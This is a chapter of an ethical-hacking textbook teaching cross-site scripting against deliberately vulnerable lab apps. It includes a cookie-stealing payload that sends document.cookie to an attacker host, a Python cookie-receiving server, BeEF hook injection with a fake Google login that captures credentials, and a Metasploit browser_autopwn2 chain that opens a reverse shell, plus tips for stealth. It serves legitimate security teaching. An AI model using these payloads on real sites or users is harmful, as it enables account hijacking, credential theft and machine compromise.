<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" xmlns:ns="http://www.w3.org/2001/10/synthesis" lang="en-us" xml:lang="en-us">
	<head>
		<title>Ethical Hacking: A Hands-on Introduction to Breaking In</title>
		<link href="../styles/9781718501881.css" rel="stylesheet" type="text/css"/>
<meta content="urn:uuid:3776231c-affd-4772-8376-b44c973236be" name="Adept.expected.resource"/>
	</head>
	<body>
		<h2 class="h2" id="ch13"><span epub:type="pagebreak" id="page_269"/><strong><span class="big">13</span><br/>SERIOUS CROSS-SITE SCRIPTING EXPLOITATION</strong></h2>
		<p class="verse"><em>Love all, trust a few, do wrong to none.</em></p>
		<p class="chap-au">–William Shakespeare, <em>All’s Well That Ends Well</em></p>
		<div class="imagec">
			<img alt="image" src="../images/common.jpg"/>
		</div>
		<p class="noindents">This chapter explores a website exploitation technique called <em>cross-site scripting (XSS)</em> that lets you run your own JavaScript in other users’ browsers when they visit a vulnerable site. Successful XSS attacks can block access to websites, steal cookies and credentials, and even compromise a user’s machine.</p>
		<p class="indent">Once you’re comfortable identifying and performing XSS attacks manually, we’ll explore the Browser Exploitation Framework, which allows you to quickly inject JavaScript into a vulnerable site for a variety of purposes. We’ll use this framework to perform social engineering attacks and collect credentials. You’ll also learn how to use a chain of exploits to take over a browser and load a reverse shell onto a machine that visits your website.</p>
		<h3 class="h3" id="ch13lev1"><span epub:type="pagebreak" id="page_270"/><strong>Cross-Site Scripting</strong></h3>
		<p class="noindent">If a web app doesn’t correctly sanitize user inputs, such as comments or blog entries, an attacker could inject malicious code into the site by entering JavaScript code into the comment form instead of a legitimate comment. For example, say the web page uses a template like the one in <a href="ch13.xhtml#ch13fig1">Figure 13-1</a>.</p>
		<div class="image" id="ch13fig1">
			<img alt="image" src="../images/ch13fig01.jpg"/>
		</div>
		<p class="figcap"><em>Figure 13-1: JavaScript that has been injected into a template using XSS</em></p>
		<p class="indent">Templates are skeletons containing placeholders that represent a web page’s general structure. When a page is rendered, a program called a template engine replaces these placeholders with values the programmer specifies. For example, a programmer may tell the template engine to replace the <span class="literal">{{name}}</span> placeholder with the last value entered into the database. If the last name in the database was Frances, the template engine would generate a page that reads <span class="literal">"Welcome Frances."</span></p>
		<p class="indent">The goal of an XSS attack is to get a web app to add malicious JavaScript to a page. In this example, an attacker could trick the web page into adding malicious code by writing a comment containing the following:</p>
		<p class="programs">&lt;script&gt; alert("You've been hacked")&lt;/script&gt;</p>
		<p class="indent">The <span class="literal">&lt;script&gt;</span> and <span class="literal">&lt;/script&gt;</span> tags represent where the JavaScript code starts and ends, respectively. In this case, the tags contain the JavaScript command <span class="literal">alert()</span>, which causes a message to pop up on the screen. The template engine will now generate a web page that contains this comment; however, because this comment contains the <span class="literal">&lt;script&gt;</span> tag, the browser interprets it as code instead of text. When the browser runs this code, it will open a dialog box containing the message <span class="literal">"You've been Hacked!"</span> If the programmer had correctly sanitized the comment, it wouldn’t have contained the <span class="literal">&lt;script&gt;</span> tags and the browser wouldn’t have interpreted it as code.</p>
		<p class="indent">Because the malicious JavaScript is stored in the web app, we commonly call this type of XSS attack a <em>stored XSS</em> attack. There are other types of XSS attacks, too, including reflected XSS and DOM XSS attacks. We’ll discuss reflected XSS attacks later in this chapter. You can find a detailed discussion of DOM XSS attacks on OWASP’s website.</p>
		<h4 class="h4" id="ch13lev2"><span epub:type="pagebreak" id="page_271"/><strong><em>How JavaScript Can Be Malicious</em></strong></h4>
		<p class="noindent">The payload you inject into the website’s code can be quite harmful. For example, it could include JavaScript code that steals a user’s cookies, allowing the attacker to impersonate them.</p>
		<p class="indent">When you visit a web page, the web server sends your browser the HTML, JavaScript, and cascading styles sheet (CSS) code it needs to render the page, and if you’ve successfully authenticated, the web server might also send your browser a cookie. As discussed in <a href="ch12.xhtml#ch12">Chapter 12</a>, a cookie is a field in the HTTP request and response that the browser and web server use to store values and maintain state. Your browser stores this cookie and includes it in any future HTTP requests it sends to the web server. This keeps users from having to log in each time they perform an action on the site. The web server verifies that the HTTP requests are authentic by checking the cookie, so if an attacker steals this cookie, they can access the victim’s account by sending HTTP requests containing the stolen cookie.</p>
		<p class="indent">To better understand cookies, let’s look at the web developer tools that allow you to view and analyze the HTML, Javascript, CSS, and cookies your browser receives. Open Firefox and then press CTRL-SHIFT-I to open its developer tools (<a href="ch13.xhtml#ch13fig2">Figure 13-2</a>).</p>
		<div class="image" id="ch13fig2">
			<img alt="image" src="../images/ch13fig02.jpg"/>
		</div>
		<p class="figcap"><em>Figure 13-2: Accessing the developer tools in Firefox</em></p>
		<p class="indent">Click the <strong>Debugger</strong> tab <span class="ent">➊</span> to reveal a window that lets you explore the page’s code. Using the panel <span class="ent">➋</span>, navigate to the associated files and folders. The window <span class="ent">➌</span> shows the associated source code. To run this JavaScript and see what it does, click the <strong>Console</strong> tab <span class="ent">➍</span>.</p>
		<p class="indent">JavaScript is an interpreted language, which means you don’t need to recompile the program to run a new command. Try entering new commands into the console. For example, enter the following command to view the page’s cookies:</p>
		<p class="programs">&gt;&gt; <span class="codestrong1">document.cookie</span><br/>
"PHPSESSID=9f611beee982be16e46d462378505ef8"</p>
		<p class="indent">To steal a victim’s cookie using this JavaScript, the attacker must inject the code into a page on the domain to which the cookie belongs. This is because of a security policy called the <em>same origin policy</em> that allows only JavaScript running on the same page to access that page’s resources. So, JavaScript on one domain can’t access cookies associated with a different <span epub:type="pagebreak" id="page_272"/>domain. For example, JavaScript running on <em>virginia.edu</em> can’t access cookies created by <em><a href="http://nostarch.com">nostarch.com</a></em>.</p>
		<p class="indent">To better understand the attack’s mechanisms, consider the following JavaScript code. It includes an HTML image tag that contains carefully crafted malicious code to steal cookies. This JavaScript is the payload that the attacker will inject into the page:</p>
		<p class="programs">&lt;script&gt;document.write('&lt;img src="https://<span class="codeitalic">&lt;Kali IP address&gt;</span>/captureCookie.php?<br/>
    
			<img alt="image" src="../images/arrow01.jpg"/>
			 cookie='+ escape(document.cookie) + '" /&gt;);&lt;/script&gt;</p>
		<p class="indent">Inside the <span class="literal">&lt;script&gt;</span> tags, the JavaScript command <span class="literal">document.write()</span> uses the browser document API to write to the <em>document object model (DOM)</em>, which is a virtual representation of the web page. Here, it writes an image (<span class="literal">&lt;img&gt;</span>). However, this image is special. Its source URL, the location from which the browser should retrieve the image, points to the attacker’s server, and its query string parameter (<span class="literal">cookie</span>) contains the user’s cookies. So when the image loads it will send the users cookies to the attacker’s server. Once an attacker has access to a victim’s cookies, they can attempt to authenticate as the user.</p>
		<p class="indent">Lastly, the cookie might contain characters that aren’t allowed in a URL, so we must escape these before sending the cookie by including it as a query string parameter in the source URL. When the browser attempts to load the image, it will generate a <span class="literal">GET</span> request to the attacker’s server, essentially sending the user’s cookies directly to the attacker.</p>
		<p class="indent">The attacker’s server that receives the cookies might be running a simple Python program like the following, which extracts the query string parameter from the <span class="literal">GET</span> request:</p>
		<p class="programs">from http.server import BaseHTTPRequestHandler, HTTPServer<br/>from http.cookies import SimpleCookie<br/>from urllib.parse import urlparse<br/>import ssl<br/>class RequestHandler(BaseHTTPRequestHandler):<br/>
    def do_GET(self):<br/>
        parameters = urlparse(self.path).query<br/>
        print(parameters)<br/><br/>if __name__ == '__main__':<br/>
    server = HTTPServer(('localhost', 443), RequestHandler)<br/>
    print('Starting Server')<br/>
    server.socket = ssl.wrap_socket (server.socket, certfile='server.crt', keyfile='server.key<br/>
     
			<img alt="image" src="../images/arrow01.jpg"/>
			 ', server_side=True)<br/>
    server.serve_forever()</p>
		<p class="indent"><span epub:type="pagebreak" id="page_273"/>Notice that it’s using an encrypted socket, so you’ll need to generate your <em>server.crt</em> certificate and private key, <em>server.key</em>. See <a href="ch06.xhtml#ch6">Chapter 6</a> for details on doing so. To be even more stealthy, you could purchase a certificate for a domain you own. After you’ve extracted the cookies, you can load them into your browser and access the user’s accounts. One way to do this is with <em>Cookie Quick Manager</em>, a Firefox extension that allows you to edit, add, and delete cookies from your browser (<a href="ch13.xhtml#ch13fig3">Figure 13-3</a>).</p>
		<div class="image" id="ch13fig3">
			<img alt="image" src="../images/ch13fig03.jpg"/>
		</div>
		<p class="figcap"><em>Figure 13-3: An example of Quick Cookie Manager</em></p>
		<p class="indent">When you install the extension, you will see a cookie icon in your toolbar <span class="ent">➊</span>. Click the cookie icon and then select <strong>Manage all Cookies</strong>. This will show all the cookies your browser currently has. When you click a specific domain <span class="ent">➋</span>, it will show you all the cookies your browser has stored for that domain. You can edit the cookies by changing the value field <span class="ent">➌</span>. You’ll need to enable editing by clicking the pencil icon at the bottom of the page. Once you’ve loaded the stolen cookies, you can access the victim’s account.</p>
		<h4 class="h4" id="ch13lev3"><strong><em>Stored XSS Attacks</em></strong></h4>
		<p class="noindent">Now that you understand the general mechanisms of an XSS attack, let’s walk through a real example by performing a stored XSS attack. As shown earlier, we’ll use a blog post to insert malicious JavaScript into a server. We’ll attack a blog page on the vulnerable Mutillidae app we used in <a href="ch12.xhtml#ch12">Chapter 12</a>. This app is hosted on Metasploitable, so start the Metasploitable virtual machine, log in to it, and get the server’s IP address using <span class="literal"><strong>ifconfig</strong></span>. Now start the web browser on your Kali Linux virtual machine and visit the “add your own blog” page in the Mutillidae app by selecting <strong>OWASP Top 10</strong> ▶ <strong>A2 Cross Site Scripting (XSS)</strong> ▶ <strong>Persistent (Second Order)</strong> ▶ <strong>Add to your blog</strong>.</p>
		<p class="indent">Now let’s test whether this page is vulnerable to XSS by attempting to inject some JavaScript into our blog post (<a href="ch13.xhtml#ch13fig4">Figure 13-4</a>).</p>
		<div class="image" id="ch13fig4">
			<span epub:type="pagebreak" id="page_274"/>
			<img alt="image" src="../images/ch13fig04.jpg"/>
		</div>
		<p class="figcap"><em>Figure 13-4: Executing the stored XSS attack in Mutillidae’s blog</em></p>
		<p class="indent">Instead of writing a regular blog post in the text box, we’ll write some JavaScript code (<span class="literal">&lt;script&gt; alert("Hacked") &lt;/script&gt;</span>) and save the post. Once you’ve refreshed the page, Mutillidae will retrieve the malicious JavaScript and embed it in the page as it would any other blog post. However, unlike other blog posts, your new blog post contains JavaScript code, which the browser will execute. If it runs successfully, it should open a pop-up containing the word <em>Hacked</em>. Save the blog post and refresh the page. This should embed the JavaScript code in the page and cause the browser to display a pop-up.</p>
		<p class="indent">To understand why this attack worked, take a look at the table in <a href="ch13.xhtml#ch13fig5">Figure 13-5</a> that shows the blog entries located directly below the <strong>Save Blog Entry</strong> button. You’ll notice an empty blog entry <span class="ent">➊</span>. This is the one we just created. To read the source code for this entry, right-click the entry and select the <strong>Inspect</strong> option from the drop-down. This will launch the developer tools.</p>
		<p class="indent">If you use the tools to read the table code and data, you should notice the table data entry (<span class="literal">&lt;td&gt;</span>) that contains your newly created post <span class="ent">➋</span>. The entry contains your malicious JavaScript, which the browser will run as code rather than displaying as text in the browser. This is why our blog entry is blank.</p>
		<div class="image" id="ch13fig5">
			<img alt="image" src="../images/ch13fig05.jpg"/>
		</div>
		<p class="figcap"><em>Figure 13-5: Using the developer tools to show where the malicious script was inserted</em></p>
		<p class="indent"><span epub:type="pagebreak" id="page_275"/>This malicious JavaScript runs when any user visits the blog page. We’ve executed a mere alert here, but we can execute any malicious JavaScript such as the cookie stealing script we wrote earlier.</p>
		<h4 class="h4" id="ch13lev4"><strong><em>Reflected XSS Attacks</em></strong></h4>
		<p class="noindent">A <em>reflected XSS</em> attack exploits a vulnerability in a web app that occurs when the app includes data from the HTTP request message in the HTTP response without adequately sanitizing it. Consider the following attack scenario. An attacker sends an email with the text “Check out this great article about hacking.” However, unbeknownst to the victim, the attacker has embedded some malicious JavaScript code into one of the query string parameters of the link included in the email. When a user clicks the link, the web server adds the malicious JavaScript in the query string parameter to the page and the browser executes it.</p>
		<p class="indent">To see an example of how query string parameters are added to pages, copy the following URL into your web browser: <em><a href="https://www.google.com/?q=Ethical+Hacking">https://www.google.com/?q=Ethical+Hacking</a></em>. Notice that Google’s server added the value in the query string parameter to the search box as a search term. Now suppose that a website doesn’t correctly sanitize query string parameters. In that case, an attacker may use a reflected XSS attack to inject malicious JavaScript into a victim’s browser.</p>
		<p class="indent">Take a look at an example that targets the DVWA installed on your Metasploitable server. You can access it using a browser on your Kali Linux machine to navigate to <em>http://&lt;Metasploitable-IP&gt;/dvwa/login.php</em>. Log in using the username <strong>admin</strong> and password <strong>password</strong>. Just like the Mutillidae app, DVWA has security levels. Click the <strong>Security</strong> tab and set the security level to <strong>low</strong>. Click the tab <strong>XSS Reflected</strong>. You should see a submission box that lets you send input to the server (<a href="ch13.xhtml#ch13fig6">Figure 13-6</a>). Try entering “test” in the submission box.</p>
		<div class="image" id="ch13fig6">
			<img alt="image" src="../images/ch13fig06.jpg"/>
		</div>
		<p class="figcap"><em>Figure 13-6: DVWA’s reflected XSS page</em></p>
		<p class="indent">Now take a look at the URL. You should notice that the <span class="literal">name</span> query parameter now contains the value <span class="literal">test</span>:</p>
		<p class="programs">http://<span class="codeitalic">&lt;Metasploitable IP address&gt;</span>/dvwa/vulnerabilities/xss\_r/<span class="codestrong1">?name=test</span>#</p>
		<p class="indent">Also notice the value of the query string parameter is reflected in the page, below the submission box. If we include JavaScript in the URL and <span epub:type="pagebreak" id="page_276"/>the app doesn’t correctly sanitize it, we can inject JavaScript directly into the page. Copy the following URL into your browser and press ENTER:</p>
		<p class="programs">http://<span class="codeitalic">&lt;Metasploitable IP address&gt;</span>/dvwa/vulnerabilities/xss\_r/?name=<span class="codestrong1">&lt;script&gt;</span><br/>
    
			<img alt="image" src="../images/arrow01.jpg"/> <span class="codestrong1">alert("hacked")&lt;/script&gt;</span></p>
		<p class="indent">Here we’re using the name query parameter to inject our alert script. If you see an alert box, you’ve successfully executed your first reflected XSS attack.</p>
		<h3 class="h3" id="ch13lev5"><strong>Finding Vulnerabilities with OWASP Zed Attack Proxy</strong></h3>
		<p class="noindent">As with SQL injection, websites protect against XSS attacks by sanitizing user input through a variety of means. OWASP maintains a document on the best ways to prevent XSS attacks, as well as strategies for evading those protections. You can find these on OWASP’s website.</p>
		<p class="indent">To help companies audit their websites, OWASP developed OWASP <em>Zed Attack Proxy (ZAP)</em>, an auditing tool that comes preinstalled with Kali Linux, that can scan applications to discover web vulnerabilities like XSS or the SQL injection attacks discussed in <a href="ch12.xhtml#ch12">Chapter 12</a>.</p>
		<p class="indent">Let’s scan the Mutillidae app to see what vulnerabilities we find. Launch OWASP and select the default setup options. After the setup is complete, click the <strong>Quick Start</strong> tab and select the automated scan.</p>
		<div class="image" id="ch13fig7">
			<img alt="image" src="../images/ch13fig07.jpg"/>
		</div>
		<p class="figcap"><em>Figure 13-7: Starting the ZAP scan</em></p>
		<p class="indent">Enter the URL of the Mutillidae app in the box. ZAP will explore all the URLs in the domain by following the links it discovers. We call the process of exploring the links in a domain <em>spidering</em> or <em>crawling</em>. However, modern web apps may sometimes use JavaScript to dynamically render URLs or access APIs, which can’t be detected with traditional spidering. For this reason, the ZAP team created the <em>Ajax spider</em>, a tool that launches the browser and then waits for the page to load before exploring it by clicking links and entering data. To use this tool, select the <strong>Use ajax spider</strong> option and the <strong>Firefox Headless</strong> option, which uses the Firefox browser without opening a window. If you select the Firefox option instead, ZAP will open Firefox and <span epub:type="pagebreak" id="page_277"/>you’ll be able to watch it explore the page with the Selenium testing framework. Once you’ve chosen these options, start the scan by clicking <strong>Attack</strong>.</p>
		<div class="image" id="ch13fig8">
			<img alt="image" src="../images/ch13fig08.jpg"/>
		</div>
		<p class="figcap"><em>Figure 13-8: The result of running a quick ZAP scan</em></p>
		<p class="indent">When the scan completes, you should see the screen shown in <a href="ch13.xhtml#ch13fig8">Figure 13-8</a>. The lower-left panel shows a list of possible web vulnerabilities ZAP has discovered. You should see that the ZAP tool found the <em>add-to-your-blog.php</em> page <span class="ent">➊</span> containing the XSS vulnerability we exploited earlier. The tool also shows the headers of the HTTP response the server generated <span class="ent">➋</span> and the body of the response, which contains the HTML <span class="ent">➌</span>. As evidence that the XSS attack is possible, the tool has highlighted where it injected the JavaScript. ZAP highlights details about the attack <span class="ent">➍</span>. This panel also contains information on the URL with the vulnerability and a short description of the vulnerability.</p>
		<p class="indent">You can probably already see that ZAP is a very useful tool. Take some time to familiarize yourself with its great features by exploring its documentation online. Another way to scan a web app is to search for known vulnerabilities associated with the technologies used to build it. Use the tools and techniques discussed in <a href="ch08.xhtml#ch8">Chapter 8</a> to discover a target’s underlying technologies. For example, you might perform a <span class="literal">whatweb</span> scan and use the <span class="literal">searchsploit</span> command line tool to find vulnerabilities associated with a specific version of the software used to build the app.</p>
		<h3 class="h3" id="ch13lev6"><span epub:type="pagebreak" id="page_278"/><strong>Using Browser Exploitation Framework Payloads</strong></h3>
		<p class="noindent">The <em>Browser Exploitation Framework (BeEF)</em> allows hackers to easily embed and control malicious JavaScript payloads in vulnerable apps. We’ll use the tool to explore the many things you can achieve with your malicious JavaScript. BeEF should come preinstalled in Kali Linux; however, if your version doesn’t have it, you can install it by using the following command:</p>
		<p class="programs">kali@kali:~$ <span class="codestrong1">sudo apt-get install beef-xss</span></p>
		<h4 class="h4" id="ch13lev7"><strong><em>Injecting the BeEF Hook</em></strong></h4>
		<p class="noindent">When the installation completes, run BeEF:</p>
		<p class="programs">kali@kali:~$ <span class="codestrong1">sudo beef-xss</span></p>
		<p class="indent">You might be asked to enter a username and password when the framework starts. Create these, and make sure to remember them. Your terminal should then display the following:</p>
		<p class="programs">   [*] Please wait for the BeEf service to start.<br/>
   [*] You might need to refresh your browser once it opens.<br/>
   [*]<br/><span class="ent">➊</span> [*]  Web UI: http://127.0.0.1:3000/ui/panel<br/><span class="ent">➋</span> [*]   Hook: &lt;script src="http//&lt;IP&gt;:3000/hook.js"&gt;&lt;/script&gt;<br/>
   [*] Example: &lt;script src="http//127.0.0.1:3000/hook.js"&gt;&lt;/script&gt;</p>
		<p class="indent">Copy the URL for the BeEF web interface <span class="ent">➊</span> and enter it into your browser. You should see the BeEF login screen, as shown in <a href="ch13.xhtml#ch13fig9">Figure 13-9</a>. Log in using the username and password you created earlier.</p>
		<div class="image" id="ch13fig9">
			<img alt="image" src="../images/ch13fig09.jpg"/>
		</div>
		<p class="figcap"><em>Figure 13-9: The BeEF login screen</em></p>
		<p class="indent"><span epub:type="pagebreak" id="page_279"/>At this point, you’ve set up your BeEF server. The server will listen for connections from the malicious JavaScript you’ll implant. The framework should also provide you with the JavaScript to inject <span class="ent">➋</span>. The script tag included here will load the <em>hook.js</em> file, a malicious JavaScript file that communicates with the BeEF server. Once the module is loaded, you can access all the features of that module.</p>
		<p class="indent">Use the stored XSS attack covered earlier in this chapter to inject this payload into Mutillidae’s blog page at <em>add-to-your-blog.php</em>. If you successfully execute the attack, the script should become embedded in the web page and your Kali Linux browser should show up in the list of the victim machines in the BeEF web UI (<a href="ch13.xhtml#ch13fig10">Figure 13-10</a>). Any browser that visits the web page should be hooked by the malicious JavaScript.</p>
		<div class="image" id="ch13fig10">
			<img alt="image" src="../images/ch13fig10.jpg"/>
		</div>
		<p class="figcap"><em>Figure 13-10: List of browsers running the malicious JavaScript</em></p>
		<p class="indent">To test this, try hooking the Firefox browser on the Ubuntu virtual machine. Start Ubuntu and visit the blog page. When the Ubuntu machine loads the page, it should be added to the list of online browsers.</p>
		<h4 class="h4" id="ch13lev8"><strong><em>Performing a Social Engineering Attack</em></strong></h4>
		<p class="noindent">What can you do after you’ve hooked the browser? Try using the BeEF framework to launch a social engineering attack. This attack will show the victim a fake login screen when they try to access the blog page. When the user enters in their username and password, the BeEF framework will capture the credentials and redirect the user to the blog page.</p>
		<p class="indent">To get started, click the Ubuntu machine’s IP address in the list of hooked browsers and select the <strong>Commands</strong> tab (<a href="ch13.xhtml#ch13fig11">Figure 13-11</a>).</p>
		<p class="indent">The <strong>Command</strong> tab contains a list of BeEF modules. I recommend looking through them; you might be surprised at all the things you can do once you can inject your own JavaScript into a site. You can even write your own BeEF modules using Ruby and JavaScript. If you’re interested in trying this, check out the documentation at <em><a href="https://github.com/beefproject/beef/wiki/Module-Creation/">https://github.com/beefproject/beef/wiki/Module-Creation/</a></em>.</p>
		<div class="image" id="ch13fig11">
			<span epub:type="pagebreak" id="page_280"/>
			<img alt="image" src="../images/ch13fig11.jpg"/>
		</div>
		<p class="figcap"><em>Figure 13-11: Performing a social engineering attack in BeEF</em></p>
		<p class="indent">Click the <strong>Social Engineering</strong> folder and select the <strong>Google Phishing</strong> attack. This attack injects JavaScript that mimics the Gmail login page. After you execute the attack, you’ll see a page similar to <a href="ch13.xhtml#ch13fig12">Figure 13-12</a> on the victim’s machine.</p>
		<div class="image" id="ch13fig12">
			<img alt="image" src="../images/ch13fig12.jpg"/>
		</div>
		<p class="figcap"><em>Figure 13-12: The fake Google login screen</em></p>
		<p class="indent">Set the <strong>XSS hook URL</strong> to <em>/index.php?page=add-to-your-blog.php</em>. When the user enters their credentials, they’ll be redirected to the page specified by the hook URL. Then, click <strong>Execute</strong> and use the Ubuntu browser to navigate to the blog page. Try entering some fake credentials in the fraudulent login screen. When you click <strong>command 1</strong> in the <strong>Module Results History</strong> panel of the BeEF interface, you should see the captured username and password (<a href="ch13.xhtml#ch13fig13">Figure 13-13</a>).</p>
		<div class="image" id="ch13fig13">
			<span epub:type="pagebreak" id="page_281"/>
			<img alt="image" src="../images/ch13fig13.jpg"/>
		</div>
		<p class="figcap"><em>Figure 13-13: Credentials stolen using the phishing attack</em></p>
		<p class="indent">The <strong>Details</strong> tab offers information the BeEF framework has collected on the browser, including the browser’s version and the type of attacks to which it might be susceptible.</p>
		<h3 class="h3" id="ch13lev9"><strong>Moving from Browser to Machine</strong></h3>
		<p class="noindent">So you’ve compromised a website. But if you hope to access the computer visiting the website, you may feel stuck. Most modern browser tabs are <em>sandboxed</em>; that is, isolated from other tabs and the operating system. This prevents malicious code running in one tab from accessing anything else on the same device.</p>
		<p class="indent">Now suppose there are vulnerabilities in the sandbox. In that case, an attacker might be able to use malicious JavaScript to exploit these vulnerabilities, escape the browser, and run a reverse shell on the targeted machine. This would allow an attacker to compromise a user’s machine by exploiting the vulnerable website. This attack could be extremely detrimental: imagine if an attacker injected malicious code into a popular social media site or search engine and subsequently accessed the machines of every visitor.</p>
		<p class="indent">Such an attack is not out of the ordinary. Each year, the Pwn2Own hacking contest gives hackers three days to break into machines through a web browser. These machines always run the latest operating systems and browsers, and there’s a winner most years.</p>
		<h4 class="h4" id="ch13lev10"><strong><em>Case Study: Exploiting an Old Version of the Chrome Browser</em></strong></h4>
		<p class="noindent">In 2017, Oliver Chang, an engineer on the Chrome security team, discovered a vulnerability in Chrome’s V8 JavaScript engine. The vulnerability allowed an attacker to perform an out-of-bounds write to launch a shell on the victim’s machine. You can find the code for the exploit in the Exploit Database under the ID 42078. When the code is run, a vulnerable version of the Chrome browser will launch the calculator app on a Linux machine. Launching a calculator has become the de facto way of demonstrating that you can escape the browser. Out-of-bounds reads and writes are great bugs to find. An attacker can use these bugs to load and execute a shell by chaining together a collection of exploitation techniques.</p>
		<p class="indent">In practice, discovering and writing exploits for browsers can be an involved process. The most popular browsers, Chrome and Safari, are developed by two large tech companies with in-house testing teams, so although traditional techniques like fuzzing and concolic execution may help you <span epub:type="pagebreak" id="page_282"/>discover vulnerabilities, keep in mind that these companies use fuzzing tools, too. For example, Google has an in-house tool for fuzzing Chrome, called <em>ClusterFuzz</em>, that they almost certainly run before releasing a new version of the browser. Thus, you might have the best results doing manual code inspection. Luckily, the browser engines used by Chrome (Blink) and Safari (Webkit) are open source, and the projects are well documented, so you can compile and debug them yourself. The Chrome team even has a free YouTube lecture series for Google Chrome developers called Chrome University. The lecture series dedicates an entire lecture to exploring the CVE-2019-5786 vulnerability, which affected Chrome in 2019 and was exploited by a state actor.</p>
		<p class="indent">Once these vulnerabilities are fixed, it takes time (days to weeks) to update the user’s device. Because these projects are open source, attackers can view and exploit these fixes before they make it to production.</p>
		<h4 class="h4" id="ch13lev11"><strong><em>Installing Rootkits via Website Exploitation</em></strong></h4>
		<p class="noindent">How might an attacker chain the exploits covered in this chapter to, say, install a rootkit on a machine when the victim visits a certain website? Consider the following attack scenario: you’ve scanned a website and discovered an XSS vulnerability in the app. We’ll call this vulnerability 1. Next, you use this vulnerability to upload malicious JavaScript code that will escape the browser’s sandbox and load a malicious reverse shell onto the victim’s machine (vulnerability 2). Once the reverse shell connects to your attacker server, you use a kernel vulnerability (discussed in <a href="ch14.xhtml#ch14">Chapter 14</a>) to escalate your privileges (vulnerability 3) and install a rootkit. You now can invisibly control the machine.</p>
		<p class="indent"><a href="ch13.xhtml#ch13fig14">Figure 13-14</a> shows the process of performing this exploit using BeEF and Metasploit.</p>
		<div class="image" id="ch13fig14">
			<img alt="image" src="../images/ch13fig14.jpg"/>
		</div>
		<p class="figcap"><em>Figure 13-14: The interactions between a web server, the victim’s laptop, and the hacker’s server</em></p>
		<p class="indent"><span epub:type="pagebreak" id="page_283"/>First, the victim visits a website containing the malicious JavaScript <span class="ent">➊</span> you’ve injected. After the victim’s browser loads the page <span class="ent">➋</span>, it activates the code, which then connects to the BeEF server <span class="ent">➌</span>. The BeEF server will then inject additional malicious JavaScript <span class="ent">➍</span> containing a link to the exploitation code on the Metasploit server. The browser will then connect to the Metasploit server <span class="ent">➎</span> and download JavaScript code that automatically scans for browser vulnerabilities <span class="ent">➏</span>. If it finds a vulnerability, the code exploits the browser and loads a reverse shell onto the machine that will connect to the Metasploit server <span class="ent">➐</span>. Now the attacker can perform a privilege escalation attack and install a rootkit.</p>
		<p class="indent">We can try performing this attack by installing a vulnerable version of the Firefox browser on the Ubuntu virtual machine. We’ll use Metasploit’s <span class="literal">browser_autopwn2</span> module to automatically scan a browser for a collection of exploits. Start the Metasploit console by opening a terminal in your Kali Linux virtual machine and running <span class="literal">msfconsole</span>. Once the Metasploit Framework is up and running, select the <span class="literal">browser_autopwn2</span> module by running the following command:</p>
		<p class="programs">msf6 &gt; <span class="codestrong1">use auxiliary/server/browser_autopwn2</span></p>
		<p class="indent">Use the <span class="literal">options</span> command to see a list of available options. We’ll keep the default options, but to be stealthier, you might want to specify an SSL certificate and URL path instead of using a randomly generated one. For example, the tool URLCrazy can identify domains that look similar to domains you’re attacking.</p>
		<p class="indent">Now start the Metasploit server running the <span class="literal">browser_autopwn</span> code:</p>
		<p class="programs">msf6 auxiliary(server/browser_autopwn2) &gt; <span class="codestrong1">run</span><br/>
   [*] Starting listeners...<br/>
   [*] Time spent: 20.41047527<br/>
   [*] Using URL: http://0.0.0.0:8080/TB19m513Mq91<br/><span class="ent">➊</span> [*] Local IP: http://192.168.1.113:8080/TB19m513Mq91<br/><br/>
   [*] The following is a list of exploits that BrowserAutoPwn will consider using.<br/>
   [*] Exploits with the highest ranking and newest will be tried first.<br/><br/><span class="ent">➋</span> Exploits<br/>
  ========<br/><br/>Order  Rank       Name                                 Payload<br/>
-----  ----       ----                                 -------<br/>
1      Excellent  firefox_webidl_injection             firefox/shell_reverse_tcp on 4442<br/>
2      Excellent  firefox_tostring_console_injection   firefox/shell_reverse_tcp on 4442<br/>
3      Excellent  firefox_svg_plugin                   firefox/shell_reverse_tcp on 4442<br/>
4      Excellent  firefox_proto_crmfrequest            firefox/shell_reverse_tcp on 4442<br/>
5      Excellent  webview_addjavascriptinterface       android/meterpreter/reverse_tcp on 4443<br/>
6      Excellent  samsung_knox_smdm_url                android/meterpreter/reverse_tcp on 4443<br/>
7      Great      adobe_flash_worker_byte_array_uaf    windows/meterpreter/reverse_tcp on 4444</p>
		<p class="indent"><span epub:type="pagebreak" id="page_284"/>You should see the URL of the server <span class="ent">➊</span> and a list of the exploits the module will try <span class="ent">➋</span>. Many of the exploits are outdated, though, and work only on Firefox 27 or earlier. However, this module is open source, so maybe someone reading this book will update it with new exploits. For now, you’ll simply need to run them against an older version of Firefox. Download and install an older version on the Ubuntu virtual machine with the following commands:</p>
		<p class="programs">victim@ubuntu:~$ wget <span class="codestrong1">ftp.mozilla.org/pub/firefox/releases/26.0/linux-x86_64/en-GB/firefox</span><br/>
    
			<img alt="image" src="../images/arrow01.jpg"/> <span class="codestrong1">-26.0.tar.bz2</span><br/><span class="codestrong1">tar -xjf firefox-26.0.tar.bz2</span><br/>victim@ubuntu:~$ <span class="codestrong1">cd firefox</span><br/>victim@ubuntu:~/firefox$ <span class="codestrong1">./firefox</span></p>
		<p class="indent">Time to use BeEF to inject some malicious JavaScript. Ensure that you’ve hooked the browser on the Ubuntu virtual machine by injecting a payload in the blog page on the Metasploitable server. Then, open the browser window containing the BeEF UI and click the browser associated with the Ubuntu virtual machine. As you did earlier in this chapter, select <strong>Commands</strong> and open the <strong>Misc</strong> folder. Click the <strong>Raw JavaScript</strong> module. This module allows you to inject any JavaScript you please into the page. In this case, we’ll inject a script that loads a malicious page associated with the <span class="literal">browser_autopwn2</span> module:</p>
		<p class="programs">window.location="http://192.168.1.113:8080/bEBTChJshPJ";</p>
		<p class="indent">This JavaScript command opens a tab in the user’s browser that will navigate to the malicious page. This is not very stealthy, but it is effective. A subtler approach would be to inject the JavaScript associated with the attack directly into the page. Click <strong>Execute</strong> and switch over to the terminal running your <span class="literal">browser_autopwn2</span> module. If the attack has successfully executed, you should have a new Meterpreter session. Enter <span class="literal"><strong>sessions</strong></span> to see a list of your available sessions:</p>
		<p class="programs">msf6 auxiliary(server/browser_autopwn2) &gt; <span class="codestrong1">sessions</span><br/><br/>Active sessions<br/>
===============<br/><br/>
  Id  Name  Type             Information  Connection<br/>
  --  ----  ----             -----------  ----------<br/>
  1         shell sparc/bsd               192.168.1.113:4442 -&gt;<br/>
    
			<img alt="image" src="../images/arrow01.jpg"/>
			 192.168.1.109:41938 (192.168.1.109)</p>
